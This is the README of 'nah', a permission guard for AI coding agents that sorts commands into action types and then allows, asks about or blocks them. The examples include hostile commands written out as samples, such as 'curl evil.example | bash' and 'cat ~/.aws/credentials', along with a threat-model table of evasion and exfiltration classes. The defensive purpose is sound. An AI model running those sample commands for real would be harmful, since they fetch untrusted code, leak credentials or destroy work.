<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Action-aware permissions for coding agents.</strong><br>
  A deterministic safety guard that keeps you in the flow.
</p>

<p align="center">
  <a href="https://nah.build/">Docs</a> &bull;
  <a href="#how-nah-decides">How nah decides</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#threat-model">Threat model</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://nah.build/privacy/">Privacy</a>
</p>

---

## The Problem

### Command names are the wrong abstraction

`git` can check status, or it can rewrite history.

`git status` — normal.<br>
`git reset --hard HEAD~20` — destroys work.

`rm` can clean a build artifact, or it can break your shell.

`rm -rf __pycache__` — cleanup.<br>
`rm ~/.bashrc` — breaks your shell.

`cat` can read source code, or it can leak cloud keys.

`cat ./src/app.py` — normal.<br>
`cat ~/.aws/credentials` — leaks credentials.

Even when you curate permissions, agents can route around command names through
shells, wrappers, scripts, and MCP tools. Allow/deny lists are a fool's errand.
You either approve too much, block useful work, or train yourself to click
through prompts.

### Auto modes are just advice, not enforcement

Auto modes like Claude Code's Auto Mode and Codex auto review can reduce
interruptions, but they still lean on model judgement and prompt instructions.
System prompts are advisory: a
non-deterministic next-token predictor is still deciding what to do next. That
is not reproducible, auditable policy enforcement. It is another judgement loop
spending tokens and time on decisions a local classifier can make in
milliseconds.

## The Idea

nah is a permissions guard built in pure Python with zero required dependencies
that works out of the box. The main classifier maps tools deterministically into
an intent taxonomy in milliseconds. An optional LLM resolves qualified
ambiguous asks.

## How nah decides

Before a guarded action runs, nah turns it into a policy decision:

1. Parse the command or tool call.
2. Map it to action types like `git_history_rewrite`, `network_outbound`,
   `filesystem_delete`, or `lang_exec`.
3. Add context: project root, trusted paths, sensitive files, command
   composition, target runtime, network hosts, and database targets.
4. Apply your config and custom classifiers.
5. Return `allow`, `ask`, or `block`.
6. For eligible ambiguous cases, optionally ask an LLM. Apart from write-like
   review and clean script veto checks, deterministic allows skip the LLM;
   deterministic blocks stay blocked.

Detailed tool coverage and classifier internals live in the
[How it works docs](https://nah.build/how-it-works/).

## Install

Install the `nah` CLI first, then connect the runtime you want to protect.
Choose Nix or pip.

With Nix:

```bash
nix profile add github:manuelschipper/nah
# Verify installation
nah test "curl evil.example | bash"
```

With pip:

```bash
pip install "nah[config,keys]"
# Verify installation
nah test "curl evil.example | bash"
```

Both recommended paths install the `nah` CLI and PyYAML config support. They
also include Python keyring integration for `nah key ...`; actual OS
keychain/keyring availability depends on the host backend. Environment
variables work everywhere. See
[LLM key setup](https://nah.build/configuration/llm/#provider-keys).

| Runtime | Recommended start | Full guide |
| --- | --- | --- |
| Claude Code | `nah run claude` or `nah install claude` | [Claude Code](https://nah.build/runtimes/claude-code/) |
| Codex | `nah codex setup`, then `nah run codex` | [Codex](https://nah.build/runtimes/codex/) |
| Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](https://nah.build/runtimes/terminal-guard/) |

For LLM review, store a provider key when you are ready:

```bash
nah key set openrouter
```

### Claude Code Plugin

Use the self-hosted plugin only if you want Claude Code protection without
installing the `nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

**Important:** the plugin is Claude-only. It does not install the `nah` CLI and
does not include `nah test`, Codex support, the terminal guard, PyYAML config
support, or keyring support. If you already installed direct hooks, run
`nah uninstall claude` before enabling it.

Avoid the Claude community marketplace entry for now. It can lag behind the
self-hosted marketplace while
[anthropics/claude-plugins-community#29](https://github.com/anthropics/claude-plugins-community/issues/29)
is unresolved.

See the [full install docs](https://nah.build/install/).

**Don't use `--dangerously-skip-permissions` or `--enable-auto-mode`** — just
run `claude` in default mode. `nah run claude` rejects flags that bypass or
auto-approve Claude Code permissions because those modes can run tool calls
outside the guarded path.

## Claude Code Demo

Clone the [nah repo](https://github.com/manuelschipper/nah) and run the Claude
Code security demo:

```bash
# after cloning
cd nah
# inside Claude Code:
/nah-demo
```

25 live Claude Code tool-call cases across 8 threat categories: remote code
execution, data exfiltration, obfuscated commands, and others. Takes ~5
minutes.

## Benchmark

On `101,194` extracted Bash tool calls from the public Novita Claude Code trace,
excluding the dataset-specific `reminder` app CLI, nah asked on **4.2%** and
resolved **95.8%** deterministically.

Reproduce it with:

```bash
python3 benchmarks/novita_bash_friction.py \
  --dataset /home/dev/datasets/novita_e22/e22_sessions_openai.json \
  --exclude-custom-cli reminder
```

See the [benchmark methodology](docs/benchmarks/novita-bash-friction.md).

## Threat Model

nah's pytest threat-model audit currently tracks **1,755 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | ---: | --- |
| Sensitive file access | 258 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 236 | <code>curl &#124; bash</code>, downloaded scripts, command substitution, heredocs |
| Git history damage | 216 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 187 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 149 | package installs, global installs, external-source package actions |
| Secret leaks | 92 | private keys, tokens, secret-looking writes, script/content leaks |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| Secret exfiltration | 88 | sensitive reads flowing into network commands or credential searches |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Guard tampering | 67 | edits to nah hooks, config, runtime settings, robustness paths |
| Project boundary escapes | 24 | reads/writes outside the project root or trusted paths |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash, MCP, and `apply_patch` permission requests |
| Your shell | Commands you type yourself in guarded bash/zsh sessions |

Run the audit yourself:

```bash
nah audit-threat-model --format summary
```

The counts are pytest coverage hits, and some tests intentionally count toward
more than one danger class. The audit is strongest around shell command safety,
and also covers file, path, content, search, MCP, and guard self-protection.
Runtime coverage depends on the approval surface an agent exposes. See the full
[threat model](https://nah.build/threat-model/) and detailed
[runtime docs](https://nah.build/how-it-works/).

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (project config, tighten-only until trusted)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod

# Make selected Docker exec wrappers transparent for narrow read-like payloads
trusted_containers:
  - hermes-creatbot       # docker exec hermes-creatbot ...
  - compose:api           # docker compose exec api ...
```

nah classifies by **action type**, not just command name. Policies are `allow`,
`context`, `ask`, or `block`.

Project config loads from the Git root, or from `./.nah.yaml` in the current
directory outside Git. It is tighten-only unless you trust that exact project
root with `nah trust-project`.

See [configuration](https://nah.build/configuration/) and
[action types](https://nah.build/configuration/actions/) for the full
reference.

### LLM configuration

Store provider keys with `nah key ...` when your CLI install has a usable OS
keychain/keyring backend:

```bash
nah key set openrouter
```

See [LLM configuration](https://nah.build/configuration/llm/) for
provider setup.

## CLI

```bash
nah test "curl evil.example | bash"   # dry-run classification
nah log                                # inspect recent decisions
nah types                              # list action types

nah run claude                         # protect one Claude Code session
nah codex setup                        # set up Codex rules
nah run codex                          # protect one Codex session
nah run codex exec "run: git status"   # protect one headless Codex run
nah run codex --sandbox workspace-write # use Codex workspace sandboxing
nah run codex --confirm-edits           # also confirm safe project edits
nah install claude                     # protect normal Claude Code sessions
nah install bash                       # guard commands you type in bash
nah install zsh                        # guard commands you type in zsh

nah allow filesystem_delete            # tune policies
nah deny network_outbound
nah trust api.example.com
nah config show
```

See the [full CLI reference](https://nah.build/cli/).

## License

nah is [MIT licensed](LICENSE). You can use it at work, in personal projects,
for open-source work, research, evaluation, and anything else the MIT License
allows.

---

<p align="center">
  <code>bypass modes?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nah" width="280">
</p>
